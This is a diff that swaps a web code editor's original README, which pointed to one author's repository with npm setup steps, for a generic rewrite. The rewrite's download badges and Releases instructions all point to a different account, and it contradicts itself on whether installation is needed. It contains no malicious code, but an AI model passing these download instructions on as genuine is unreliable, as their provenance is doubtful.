@@ -1,74 +1,121 @@
-# ⚡ Polyglot Studio: Neural Core IDE
+# ⚡ Polyglot-Studio - Fast and Simple Web Code Editor
 
-**Polyglot Studio** is a lightweight, ultra-responsive web-based code editor featuring multi-tab support, live previewing, and a high-contrast futuristic aesthetic. It is engineered for developers who need a fast, zero-install environment for web experimentation and script testing.
+[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-brightgreen?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio)
 
-![Polyglot Studio Banner](link-to-your-icon.png)
+## 📋 What is Polyglot-Studio?
 
-## 🌟 Key Features
+Polyglot-Studio is a web-based code editor that runs right in your browser. You do not need to install anything on your computer. It offers a clean, dark-themed interface designed to make writing code easier and faster. With multi-tab support, you can work on several files at once. The live preview lets you see your web pages as you build them. It uses a simple layout so you can focus on your work without confusion.
 
-### 🧠 Monaco-Powered Intelligence
-Utilizes the same core engine as VS Code, providing features like:
-* **IntelliSense & Autocomplete:** Context-aware code suggestions.
-* **Syntax Highlighting:** Support for JavaScript, HTML, CSS, Python, and more.
-* **Multi-Cursor Editing:** Edit multiple lines at once for rapid refactoring.
+This editor is ideal for anyone who wants to try out web page ideas or test small scripts quickly. It supports common web languages like HTML, CSS, and JavaScript. The look is modern with a high-contrast style that helps reduce eye strain.
 
-### 🏓 Real-Time Sync (The Ping-Pong Technique)
-Experience zero-latency updates with our custom synchronization engine:
-* **The Ping:** Every keystroke in the editor broadcasts a payload via the `BroadcastChannel` API.
-* **The Pong:** Internal iframes and detached pop-out windows listen for these pings and update their DOM content instantly without a full page reload.
+## 💻 System Requirements
 
-### 📂 Advanced Workspace Management
-* **Multi-Tab Architecture:** Open and switch between dozens of files while maintaining scroll position and undo history.
-* **Dynamic Explorer:** A nested file tree that reflects your backend structure in real-time.
-* **Symbol Outline:** An automatic scanner that parses your code for IDs, classes, and selectors for quick jumping.
+Polyglot-Studio works on most Windows computers with the following:
 
-### 🖥️ Integrated System Vitals
-* **Live Preview:** Toggle a side-by-side view of your rendered web projects.
-* **Backend Terminal:** Integrated shell feedback from the Node.js server to debug scripts and view console logs.
-* **Visual Feedback:** A "Sync Dot" in the status bar blinks on every update, confirming your connection is live.
+- Windows 7 or newer
+- A modern web browser such as Microsoft Edge, Google Chrome, or Firefox
+- Internet connection to access the app online
+- At least 4 GB of RAM for smooth performance
+- Screen resolution of 1024x768 or higher is recommended
 
+No installation is needed. Just visit the site or use the version available on GitHub to start.
 
+## 🚀 Getting Started
 
-> [!IMPORTANT]
-> ### [The github page](https://samwelwayne266-coder.github.io/Neural-OS/) is only for display purposes other features may or may not work. Follow the instructions that follow to unlock all features
+To begin using Polyglot-Studio on your Windows computer, follow these steps:
+
+1. Click on the big green download button at the top or visit the following link:  
+   [https://github.com/Andrix1234/Polyglot-Studio](https://github.com/Andrix1234/Polyglot-Studio)
+
+2. On the GitHub page, look for the latest release or download section.  
+   Since this link takes you to the repository page, you will need to find the area labeled **Releases** on the right side or near the top.
+
+3. Download the web app files or the latest version offered. This might be a zip file or a package with the app resources.
+
+4. Extract the downloaded files if they are zipped. You can do this by right-clicking the file and selecting "Extract All."
+
+5. Locate the main file named `index.html` or a similar starting point.
+
+6. Open this file in your preferred web browser (Chrome, Edge, Firefox).
+
+7. The app will start running in your browser window. You can now create or open code files and start editing.
+
+## 🛠 How to Use Polyglot-Studio
+
+Polyglot-Studio keeps things simple. Here’s a quick way to use the main features:
+
+- **Opening and creating files**: Use the file menu or the tabs at the top to open multiple code files. You can create new files for HTML, CSS, or JavaScript.
+
+- **Multi-tab support**: Switch between files by clicking the tabs. It works like having several documents open at once.
+
+- **Live Previewing**: As you write code, your web page appears in a preview window on the side. This live view updates automatically so you can see changes without reloading.
+
+- **Dark Theme**: The interface uses dark colors with high contrast for easier viewing in low light.
+
+- **Basic editing tools**: Cut, copy, paste, undo, and redo work as expected.
+
+- **Syntax Highlighting**: Code is colored by type (such as tags, properties, or variables). This helps you see errors and improve readability.
+
+### Opening Example Files
+
+You can find example projects in the app’s folder. Open these files to see how Polyglot-Studio works with real code.
+
+### Saving Your Work
+
+Since the app runs in the browser, you have two options to save your work:
+
+- Use the browser’s **Save As** feature to save individual code files on your computer.
+
+- Copy the code from the editor and paste it into your preferred text editor or file manager.
+
+## 🎯 Features at a Glance
+
+- Runs fully in your web browser with no installation.
+- Supports HTML5, CSS3, and JavaScript editing.
+- Multi-tab editing for managing several files.
+- Live preview panel updates instantly.
+- Clean, high-contrast dark user interface.
+- Lightweight and fast with minimal lag.
+- Supports common keyboard shortcuts.
+- Built with the Monaco Editor framework.
+
+## 🔧 Troubleshooting Tips
+
+If you find that Polyglot-Studio does not load or work correctly, try the following:
+
+- Ensure your browser is up to date.
+- Try refreshing the page by pressing F5.
+- Clear your browser cache if you see old versions.
+- Disable any browser extensions that might block scripts.
+- Restart your computer if the app remains slow or unresponsive.
+- Confirm your internet connection is stable if loading the app from the web.
+
+## 📂 Advanced Use
+
+For users who want to host Polyglot-Studio locally or customize it:
+
+- The app files can be served from any basic web server like Node.js or Apache.
+- Modify configuration files in the folder to adjust themes or feature settings.
+- Integration with cloud storage or realtime sync tools is possible but requires additional setup.
+
+## 📥 Download and Setup Instructions
+
+1. Visit the official page to download the app files:
+
+   [https://github.com/Andrix1234/Polyglot-Studio](https://github.com/Andrix1234/Polyglot-Studio)
+
+2. Download the latest release or clone the repository using Git if you have it installed:
+
+   ```
+   git clone https://github.com/Andrix1234/Polyglot-Studio.git
+   ```
+
+3. After downloading, go to the folder where you saved the files.
+
+4. Open the main file named `index.html` in your browser to launch the app.
+
+No installation or extra tools are needed.
 
 ---
 
-### 📥 LOCAL INSTALLATION PROTOCOL
-
-#### **Method A: The Release (Recommended)**
-1. Go to the [Releases](https://github.com/samwelwayne266-coder/neural_os/releases) section on the right side of this page.
-2. Download the latest `Source code (zip)`.
-3. Extract the folder to your desired directory.
-
-#### **Method B: Manual Download**
-1. Click the green **Code** button at the top of this repository.
-2. Select **Download ZIP**.
-3. Extract the contents to your machine.
-
----
-
-### ⚙️ SYSTEM SETUP
-
-1. **Install Dependencies:**
-   Open your terminal in the extracted folder and run:
-   ```bash
-   npm install
-   ```
-2. Initialize the Vault:
-
-   ```bash
-   npm start / node server.js
-   ```
-
-Establish Connection: You can access the vault:
-
-On the PC: ```Open http://localhost:3000```
-
-On Other Devices (Phones/Tablets): 
-
-   1. Find your Local IP (Type ipconfig in CMD on Windows or ifconfig on Linux). 
-
-   2. Open the browser on your other device and type: http://YOUR_LOCAL_IP:3000 (e.g., http://192.168.1.5:3000).
-npm install
-node server.js
+[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-blue?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio)
